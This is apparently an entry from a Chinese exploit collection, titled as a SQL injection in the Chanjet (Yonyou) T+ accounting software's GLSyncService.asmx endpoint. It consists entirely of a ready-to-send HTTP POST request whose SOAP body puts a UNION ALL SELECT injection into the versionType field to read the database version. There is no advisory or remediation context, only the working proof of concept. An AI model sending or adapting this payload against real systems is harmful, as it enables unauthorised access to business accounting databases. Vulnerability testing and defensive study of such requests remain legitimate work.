畅捷通/用友 畅捷通T+ GLSyncService.asmx SQL注入.txt

POST /tplus/GLSyncService.asmx HTTP/1.1
Host: 
SOAPAction: "http://www.chanjet.com/GetSourceAccountDataTable"
Content-Type: text/xml; charset=utf-8

<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">  <soap:Body>    <GetSourceAccountDataTable xmlns="http://www.chanjet.com/">      <versionType>' UNION ALL SELECT NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>    </GetSourceAccountDataTable>  </soap:Body></soap:Envelope>